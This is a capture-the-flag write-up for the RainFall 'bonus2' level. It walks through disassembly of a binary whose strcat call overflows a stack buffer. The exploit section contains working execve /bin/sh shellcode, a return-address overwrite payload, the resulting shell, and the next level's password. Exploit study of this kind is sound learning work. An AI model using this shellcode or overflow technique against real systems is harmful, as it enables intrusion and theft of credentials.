# bonus2

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048529 <+0>:      push   ebp
   0x0804852a <+1>:      mov    ebp,esp
   0x0804852c <+3>:      push   edi
   0x0804852d <+4>:      push   esi
   0x0804852e <+5>:      push   ebx
   0x0804852f <+6>:      and    esp,0xfffffff0
   0x08048532 <+9>:      sub    esp,0xa0                                ; 160 bytes of stack space
   0x08048538 <+15>:     cmp    DWORD PTR [ebp+0x8],0x3                 ; compare argc to 3
   0x0804853c <+19>:     je     0x8048548 <main+31>                     ; if equal jump to <main+31>
   0x0804853e <+21>:     mov    eax,0x1                                 ; else set eax to 1
   0x08048543 <+26>:     jmp    0x8048630 <main+263>                    ; then jump to <main+263>
   0x08048548 <+31>:     lea    ebx,[esp+0x50]                          ; load buffer1 to ebx
   0x0804854c <+35>:     mov    eax,0x0                                 ; eax = 0
   0x08048551 <+40>:     mov    edx,0x13                                ; edx = 19
   0x08048556 <+45>:     mov    edi,ebx                                 ; edi = ebx (buffer1)
   0x08048558 <+47>:     mov    ecx,edx                                 ; ecx = edx (19)
   0x0804855a <+49>:     rep stos DWORD PTR es:[edi],eax                ; while ecx != 0;[edi] = 0 (+increment) 
   0x0804855c <+51>:     mov    eax,DWORD PTR [ebp+0xc]                 ; eax = argv
   0x0804855f <+54>:     add    eax,0x4                                 ; argv + 4 (argv[1])
   0x08048562 <+57>:     mov    eax,DWORD PTR [eax]                     ; argv[1] content to eax
   0x08048564 <+59>:     mov    DWORD PTR [esp+0x8],0x28                ; push <strncpy> 3rg arg to stack (40)
   0x0804856c <+67>:     mov    DWORD PTR [esp+0x4],eax                 ; push <strncpy> 2nd arg to stack (argv[1])
   0x08048570 <+71>:     lea    eax,[esp+0x50]                          ; load buffer to eax
   0x08048574 <+75>:     mov    DWORD PTR [esp],eax                     ; push <strncpy> 1st arg to stack (buffer)
   0x08048577 <+78>:     call   0x80483c0 <strncpy@plt>                 ; strncpy(buffer, argv[1], 40)
   0x0804857c <+83>:     mov    eax,DWORD PTR [ebp+0xc]                 ; eax = argv
   0x0804857f <+86>:     add    eax,0x8                                 ; argv + 8 (argv[2])
   0x08048582 <+89>:     mov    eax,DWORD PTR [eax]                     ; argv[2] content to eax
   0x08048584 <+91>:     mov    DWORD PTR [esp+0x8],0x20                ; push <strncpy> 3rg arg to stack (32)
   0x0804858c <+99>:     mov    DWORD PTR [esp+0x4],eax                 ; push <strncpy> 2nd arg to stack (argv[2])
   0x08048590 <+103>:    lea    eax,[esp+0x50]                          ; load buffer to eax
   0x08048594 <+107>:    add    eax,0x28                                ; eax + 40 (buffer + 40)
   0x08048597 <+110>:    mov    DWORD PTR [esp],eax                     ; push <strncpy> 1st arg to stack (buffer + 40)
   0x0804859a <+113>:    call   0x80483c0 <strncpy@plt>                 ; strncpy(buffer + 40, argv[2], 32)
   0x0804859f <+118>:    mov    DWORD PTR [esp],0x8048738               ; push <getenv> 1st arg to stack ("LANG")
   0x080485a6 <+125>:    call   0x8048380 <getenv@plt>                  ; getenv("LANG")
   0x080485ab <+130>:    mov    DWORD PTR [esp+0x9c],eax                ; lang (stack var) = <getenv> return value
   0x080485b2 <+137>:    cmp    DWORD PTR [esp+0x9c],0x0                ; compare lang to NULL
   0x080485ba <+145>:    je     0x8048618 <main+239>                    ; if equal jump to <+239>
   0x080485bc <+147>:    mov    DWORD PTR [esp+0x8],0x2                 ; push <memcmp> 3rd arg to stack (2)
   0x080485c4 <+155>:    mov    DWORD PTR [esp+0x4],0x804873d           ; push <memcmp> 2nd arg to stack ("fi")
   0x080485cc <+163>:    mov    eax,DWORD PTR [esp+0x9c]                ; eax = lang
   0x080485d3 <+170>:    mov    DWORD PTR [esp],eax                     ; push <memcmp> 1st arg to stack (lang)
   0x080485d6 <+173>:    call   0x8048360 <memcmp@plt>                  ; memcmp(lang, "fi", 2)
   0x080485db <+178>:    test   eax,eax                                 ; compare <memcmp> return value to 0
   0x080485dd <+180>:    jne    0x80485eb <main+194>                    ; if not equal jump to <main+194>
   0x080485df <+182>:    mov    DWORD PTR ds:0x8049988,0x1              ; language (data segment variable) = 1
   0x080485e9 <+192>:    jmp    0x8048618 <main+239>                    ; jump to <main+239>
   0x080485eb <+194>:    mov    DWORD PTR [esp+0x8],0x2                 ; push <memcmp> 3rd arg to stack (2)
   0x080485f3 <+202>:    mov    DWORD PTR [esp+0x4],0x8048740           ; push <memcmp> 2nd arg to stack ("nl")
   0x080485fb <+210>:    mov    eax,DWORD PTR [esp+0x9c]                ; eax = lang
   0x08048602 <+217>:    mov    DWORD PTR [esp],eax                     ; push <memcmp> 1st arg to stack (lang)
   0x08048605 <+220>:    call   0x8048360 <memcmp@plt>                  ; memcmp(lang, "nl", 2)
   0x0804860a <+225>:    test   eax,eax                                 ; compare <memcmp> return value to 0
   0x0804860c <+227>:    jne    0x8048618 <main+239>                    ; if not equal jump to <main+239>
   0x0804860e <+229>:    mov    DWORD PTR ds:0x8049988,0x2              ; language = 2
   0x08048618 <+239>:    mov    edx,esp                                 ; edx = lang from <getenv>
   0x0804861a <+241>:    lea    ebx,[esp+0x50]                          ; load buffer1 to ebx
   0x0804861e <+245>:    mov    eax,0x13                                ; eax = 19
   0x08048623 <+250>:    mov    edi,edx                                 ; edi = lang
   0x08048625 <+252>:    mov    esi,ebx                                 ; esi = buffer1
   0x08048627 <+254>:    mov    ecx,eax                                 ; ecx = 19
   0x08048629 <+256>:    rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi] ; while ecx != 0; [lang] = [buffer1]
   0x0804862b <+258>:    call   0x8048484 <greetuser>                   ; greetuser(buffer1 ???, lang ???)
   0x08048630 <+263>:    lea    esp,[ebp-0xc]                           ; load return value to stack (from eax ???)
   0x08048633 <+266>:    pop    ebx
   0x08048634 <+267>:    pop    esi
   0x08048635 <+268>:    pop    edi
   0x08048636 <+269>:    pop    ebp
   0x08048637 <+270>:    ret
End of assembler dump.
```

Interesting calls here : `strncpy` which is used to copy argv[1] and argv[2] in two buffers declared on the stack.

```gdb
gdb-peda$ disas greetuser
Dump of assembler code for function greetuser:
   0x08048484 <+0>:      push   ebp
   0x08048485 <+1>:      mov    ebp,esp
   0x08048487 <+3>:      sub    esp,0x58                                ; 88 bytes of stack space
   0x0804848a <+6>:      mov    eax,ds:0x8049988                        ; eax = language value
   0x0804848f <+11>:     cmp    eax,0x1                                 ; compare language to 1
   0x08048492 <+14>:     je     0x80484ba <greetuser+54>                ; if equal jump to <greetuser+54>
   0x08048494 <+16>:     cmp    eax,0x2                                 ; compare language to 2
   0x08048497 <+19>:     je     0x80484e9 <greetuser+101>               ; if equal jump to <greetuser+101>
   0x08048499 <+21>:     test   eax,eax                                 ; compare language to 0
   0x0804849b <+23>:     jne    0x804850a <greetuser+134>               ; if not equal jump to <greetuser+134>
   0x0804849d <+25>:     mov    edx,0x8048710                           ; edx = text section address ("Hello ")
   0x080484a2 <+30>:     lea    eax,[ebp-0x48]                          ; load buffer2 to eax
   0x080484a5 <+33>:     mov    ecx,DWORD PTR [edx]                     ; ecx = "Hell"
   0x080484a7 <+35>:     mov    DWORD PTR [eax],ecx                     ; content of eax = ecx
   0x080484a9 <+37>:     movzx  ecx,WORD PTR [edx+0x4]                  ; ecx = "o "
   0x080484ad <+41>:     mov    WORD PTR [eax+0x4],cx                   ; eax + 4 = " " (space char) ???
   0x080484b1 <+45>:     movzx  edx,BYTE PTR [edx+0x6]                  ; edx = content of edx + 6 (after "Hello ", equal to 0)
   0x080484b5 <+49>:     mov    BYTE PTR [eax+0x6],dl                   ; eax + 6 = '\0' (terminating "Hello " string)
   0x080484b8 <+52>:     jmp    0x804850a <greetuser+134>               ; jump to <greetuser+134>
   0x080484ba <+54>:     mov    edx,0x8048717                           ; edx = text section address ("Hyvää päivää ")
   0x080484bf <+59>:     lea    eax,[ebp-0x48]                          ; load buffer2 to eax
   0x080484c2 <+62>:     mov    ecx,DWORD PTR [edx]                     ; ecx = edx content
   0x080484c4 <+64>:     mov    DWORD PTR [eax],ecx                     ; eax content = ecx
   0x080484c6 <+66>:     mov    ecx,DWORD PTR [edx+0x4]                 ; ecx = 
   0x080484c9 <+69>:     mov    DWORD PTR [eax+0x4],ecx                 ; 
   0x080484cc <+72>:     mov    ecx,DWORD PTR [edx+0x8]                 ; 
   0x080484cf <+75>:     mov    DWORD PTR [eax+0x8],ecx                 ; 
   0x080484d2 <+78>:     mov    ecx,DWORD PTR [edx+0xc]                 ; 
   0x080484d5 <+81>:     mov    DWORD PTR [eax+0xc],ecx                 ; 
   0x080484d8 <+84>:     movzx  ecx,WORD PTR [edx+0x10]                 ; 
   0x080484dc <+88>:     mov    WORD PTR [eax+0x10],cx                  ;
   0x080484e0 <+92>:     movzx  edx,BYTE PTR [edx+0x12]                 ; 
   0x080484e4 <+96>:     mov    BYTE PTR [eax+0x12],dl                  ;
   0x080484e7 <+99>:     jmp    0x804850a <greetuser+134>               ; jump to <greetuser+134>
   0x080484e9 <+101>:    mov    edx,0x804872a                           ; edx = text section address ("Goedemiddag!")
   0x080484ee <+106>:    lea    eax,[ebp-0x48]                          ; load buffer to eax
   0x080484f1 <+109>:    mov    ecx,DWORD PTR [edx]                     ; ecx = edx content
   0x080484f3 <+111>:    mov    DWORD PTR [eax],ecx                     ; eax content = ecx
   0x080484f5 <+113>:    mov    ecx,DWORD PTR [edx+0x4]                 ; 
   0x080484f8 <+116>:    mov    DWORD PTR [eax+0x4],ecx                 ; 
   0x080484fb <+119>:    mov    ecx,DWORD PTR [edx+0x8]                 ;
   0x080484fe <+122>:    mov    DWORD PTR [eax+0x8],ecx                 ; 
   0x08048501 <+125>:    movzx  edx,WORD PTR [edx+0xc]                  ; 
   0x08048505 <+129>:    mov    WORD PTR [eax+0xc],dx                   ; 
   0x08048509 <+133>:    nop
   0x0804850a <+134>:    lea    eax,[ebp+0x8]                           ; load buffer1 sent from <main> to eax
   0x0804850d <+137>:    mov    DWORD PTR [esp+0x4],eax                 ; push <strcat> 2nd arg to stack (buffer)
   0x08048511 <+141>:    lea    eax,[ebp-0x48]                          ; load buffer2 to eax
   0x08048514 <+144>:    mov    DWORD PTR [esp],eax                     ; push <strcat> 1st arg to stack (buffer2)
   0x08048517 <+147>:    call   0x8048370 <strcat@plt>                  ; strcat(buffer2, buffer1)
   0x0804851c <+152>:    lea    eax,[ebp-0x48]                          ; load buffer2 to eax
   0x0804851f <+155>:    mov    DWORD PTR [esp],eax                     ; push <puts> arg to stack (buffer2)
   0x08048522 <+158>:    call   0x8048390 <puts@plt>                    ; puts(buffer2)
   0x08048527 <+163>:    leave
   0x08048528 <+164>:    ret
End of assembler dump.
```

A potential vulnerability in this function calling `strcat` wich we already know that it is unsecure.

> Note : The exploit here is very similar to `bonus0`, so we will not explain the whole process with the same level of details. In order to be as explicit as possible, we will use the following terms to distinguish the different buffers used in the program :
- main buffer 1 and 2 : 40 and 32 byte long respectively, declared and filled in the `main` by `strncpy`.
- final buffer : 72 byte long, declared and filled in `greetuser` by a hardcoded value + `strcat`.

The program requires two arguments which are copied as strings to main buffers, then use the `getenv` function to get the value of the environment variable `LANG`. Comparing this value to "fi" and "nl", it sets the global variable language and uses it to fill the beginning of the final buffer in `greetuser` function. Finally, it appends the main buffer 1 to the final buffer thanks to `strcat`.

## Exploit

The exploit is a classic buffer overflow attack, which will occurs on the final buffer, when `strcat` will append both main buffers to it thanks to the lack of a terminating '\0' at the enf of the main buffer 1.

The first step is to set the environment variable `LANG` to "nl". This way, the first part of the final buffer will be filled by the string "Goedemiddag! " (13 byte long) which will help us to overflow the final buffer. If you set the `LANG` variable to "fi", the copied string will be "Hyvää päivää ". This string contains some wide characters so it will be more complicated to count the resulting number of bytes. Any other value (or none) of the variable gives us the string "Hello " which is not long enough to perform the final buffer overflow.

```console
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ env | grep LANG
LANG=nl
```

Then, we use the same tools as usual to find the offset of the return address of the function `greetuser`, which is the 23rd byte of the second argument provided. Now we set an environment variable containing a short NOP sled + an `execve` call to spawn a shell.

```console
bonus2@RainFall:~$ export SHELLCODE=`python -c 'print "\x90"*10 + "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`
bonus2@RainFall:~$ env | grep SHELLCODE
SHELLCODE=�����������1�[�C��C
                             �
                              ��S
                                  ̀�����/bin/sh
```

Finally, we find the stack address of our variable thanks to GDB and Peda, then add 16 to it in order to jump somewhere in the NOP sled. We can now execute the buffer overflow attack by providing the appropriate parameters to the executable.

```console
bonus2@RainFall:~$ ./bonus2 `python -c 'print "A"*40 + " " + "A"*23 + "\xe9\xf8\xff\xbf"'`
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```